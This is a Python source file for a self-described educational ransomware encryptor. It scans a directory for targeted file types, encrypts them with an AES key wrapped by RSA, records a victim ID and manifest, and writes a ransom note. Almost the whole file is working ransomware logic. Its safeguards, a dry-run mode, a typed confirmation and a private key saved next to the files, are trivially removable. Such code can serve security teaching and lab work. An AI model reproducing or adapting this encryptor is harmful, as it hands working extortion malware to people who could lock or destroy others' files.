"""
Educational Ransomware - File Encryptor
⚠️ FOR EDUCATIONAL PURPOSES ONLY

This demonstrates ransomware encryption behavior for educational purposes.
NEVER use this on systems you don't own or without explicit authorization.
"""

import os
import sys
from pathlib import Path
from datetime import datetime
import uuid
import argparse

from crypto_engine import CryptoEngine, EncryptionManifest


class RansomwareEncryptor:
    """Educational ransomware encryptor"""

    def __init__(self, target_path: Path, dry_run: bool = False):
        self.target_path = target_path
        self.dry_run = dry_run
        self.crypto = CryptoEngine()
        self.manifest = EncryptionManifest()
        self.victim_id = str(uuid.uuid4())

        # Statistics
        self.files_encrypted = 0
        self.files_skipped = 0

        print("=" * 60)
        print("⚠️  EDUCATIONAL RANSOMWARE SIMULATOR")
        print("⚠️  FOR AUTHORIZED TESTING ONLY")
        print("=" * 60)
        print()

    def find_target_files(self) -> list:
        """Find files to encrypt"""
        target_files = []

        print(f"🔍 Scanning directory: {self.target_path}")

        for root, dirs, files in os.walk(self.target_path):
            # Skip hidden directories
            dirs[:] = [d for d in dirs if not d.startswith('.')]

            for file in files:
                file_path = Path(root) / file

                # Skip if already encrypted
                if file_path.suffix == self.crypto.ENCRYPTED_EXTENSION:
                    continue

                # Check if extension matches target
                if file_path.suffix.lower() in self.crypto.TARGET_EXTENSIONS:
                    target_files.append(file_path)

        print(f"📁 Found {len(target_files)} target files\n")
        return target_files

    def encrypt_files(self, target_files: list):
        """Encrypt all target files"""
        if not target_files:
            print("No files to encrypt")
            return

        # Generate master AES key
        aes_key = self.crypto.generate_file_key()
        print(f"🔑 Generated AES-256 key: {aes_key.hex()[:32]}...")

        # Encrypt AES key with RSA
        encrypted_aes_key = self.crypto.encrypt_key_with_rsa(aes_key)
        print(f"🔐 Encrypted AES key with RSA\n")

        # Setup manifest
        self.manifest.set_victim_id(self.victim_id)
        self.manifest.set_timestamp(datetime.now().isoformat())
        self.manifest.set_encrypted_key(encrypted_aes_key)

        # Encrypt files
        print("🔒 Encrypting files...\n")
        for i, file_path in enumerate(target_files, 1):
            print(f"[{i}/{len(target_files)}] {file_path.name}...", end=" ")

            if self.dry_run:
                print("SKIPPED (dry-run)")
                continue

            try:
                if self.crypto.encrypt_file(file_path, aes_key):
                    self.manifest.add_file(str(file_path))
                    self.files_encrypted += 1
                    print("✅ ENCRYPTED")
                else:
                    self.files_skipped += 1
                    print("❌ FAILED")
            except Exception as e:
                print(f"❌ ERROR: {e}")
                self.files_skipped += 1

        # Save manifest
        if not self.dry_run:
            self.manifest.save()
            print(f"\n💾 Manifest saved to: {self.manifest.manifest_path}")

        # Save private key (for decryptor - in real ransomware this is kept secret)
        if not self.dry_run:
            key_file = self.target_path / f"PRIVATE_KEY_{self.victim_id}.pem"
            with open(key_file, 'wb') as f:
                f.write(self.crypto.export_private_key())
            print(f"🔑 Private key saved to: {key_file}")
            print("   (In real ransomware, this would be kept by attacker)")

        # Display ransom note
        self.display_ransom_note()

    def display_ransom_note(self):
        """Display ransom note"""
        ransom_note = f"""
{'=' * 60}
🚨 YOUR FILES HAVE BEEN ENCRYPTED! 🚨
{'=' * 60}

Victim ID: {self.victim_id}
Encrypted files: {self.files_encrypted}
Encryption time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

⚠️  EDUCATIONAL DEMONSTRATION ONLY ⚠️

This is a demonstration of ransomware encryption behavior.
In a real attack, your files would be encrypted and you would
need to pay a ransom to get the decryption key.

To decrypt your files, use the decryptor tool with your
private key:

    python decryptor.py --key PRIVATE_KEY_{self.victim_id}.pem

{'=' * 60}
IMPORTANT: This is for educational purposes only.
NEVER use this on systems you don't own!
{'=' * 60}
"""
        print(ransom_note)

        # Save ransom note to file
        if not self.dry_run:
            note_file = self.target_path / "RANSOM_NOTE.txt"
            with open(note_file, 'w') as f:
                f.write(ransom_note)
            print(f"\n📝 Ransom note saved to: {note_file}\n")

    def run(self):
        """Execute encryption"""
        # Find target files
        target_files = self.find_target_files()

        if not target_files:
            print("No target files found. Exiting.")
            return

        # Confirm action
        if not self.dry_run:
            print("⚠️  WARNING: This will encrypt files in the target directory!")
            response = input("Type 'ENCRYPT' to continue: ")
            if response != 'ENCRYPT':
                print("Operation cancelled")
                return
            print()

        # Encrypt files
        self.encrypt_files(target_files)

        # Print statistics
        print("\n📊 Statistics:")
        print(f"   Files encrypted: {self.files_encrypted}")
        print(f"   Files skipped: {self.files_skipped}")
        print(f"   Total processed: {len(target_files)}\n")


def main():
    """Main function"""
    parser = argparse.ArgumentParser(
        description="Educational Ransomware Encryptor",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
⚠️  FOR EDUCATIONAL PURPOSES ONLY
This tool demonstrates ransomware encryption behavior.
NEVER use on systems you don't own or without authorization.
        """
    )

    parser.add_argument(
        "target",
        type=str,
        help="Target directory to encrypt"
    )
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="Simulate without actually encrypting"
    )

    args = parser.parse_args()

    target_path = Path(args.target).resolve()

    if not target_path.exists():
        print(f"Error: Target path does not exist: {target_path}")
        sys.exit(1)

    if not target_path.is_dir():
        print(f"Error: Target path is not a directory: {target_path}")
        sys.exit(1)

    # Run encryptor
    encryptor = RansomwareEncryptor(target_path, dry_run=args.dry_run)
    encryptor.run()


if __name__ == "__main__":
    main()
